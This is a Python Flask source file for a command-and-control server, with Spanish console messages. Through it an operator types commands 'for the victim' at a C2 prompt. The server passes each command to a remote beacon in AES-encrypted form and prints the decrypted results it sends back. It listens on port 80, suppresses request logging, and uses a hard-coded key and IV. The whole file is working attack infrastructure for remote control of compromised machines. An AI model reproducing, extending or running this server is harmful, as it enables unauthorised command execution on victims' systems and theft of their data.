import logging
from flask import Flask, request
from Crypto.Cipher import AES
import base64
import threading
import sys
import time

log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

app = Flask(__name__)
current_task = "IDLE"

KEY = b"1234567890123456"
IV = b"1234567890123456"

def encrypt_message(data):
    cipher = AES.new(KEY, AES.MODE_CBC, IV)
    data_bytes = data.encode('utf-8')
    padding_len = 16 - (len(data_bytes) % 16)
    padded_data = data_bytes + bytes([padding_len]) * padding_len
    encrypted = cipher.encrypt(padded_data)
    return base64.b64encode(encrypted).decode('utf-8')

def decrypt_message(enc_data):
    try:
        if not enc_data:
            return ""
        enc_bytes = base64.b64decode(enc_data)
        cipher = AES.new(KEY, AES.MODE_CBC, IV)
        decrypted = cipher.decrypt(enc_bytes)

        if len(decrypted) == 0:
            return ""

        padding_len = decrypted[-1]
        return decrypted[:-padding_len].decode('utf-8')
    except Exception as e:
        return f"[Error descifrando: {e}]"

@app.route('/tasks', methods=['GET'])
def send_task():
    global current_task
    task_to_send = current_task
    current_task = "IDLE"
    return encrypt_message(task_to_send)

@app.route('/results', methods=['POST'])
def receive_results():
    encrypted_result = request.get_data(as_text=True)
    decrypted_result = decrypt_message(encrypted_result)

    print(f"\n\n[+] Respuesta del Beacon:\n{decrypted_result}")
    print("C2> ", end="", flush=True)
    return "OK"

def run_flask():
    app.run(host='0.0.0.0', port=80, debug=False, use_reloader=False)

if __name__ == '__main__':
    flask_thread = threading.Thread(target=run_flask)
    flask_thread.daemon = True
    flask_thread.start()

    time.sleep(1)
    print("\n[*] Servidor C2 en escucha (Puerto 80).")
    print("[*] Escribe comandos para la víctima. Escribe 'exit' para salir.\n")

    while True:
        try:
            cmd = input("C2> ")
            if cmd.strip() == "":
                continue
            if cmd.lower() == "exit":
                print("[!] Apagando servidor C2...")
                sys.exit(0)

            current_task = cmd

        except KeyboardInterrupt:
            print("\n[!] Interrupción detectada. Apagando...")
            sys.exit(0)
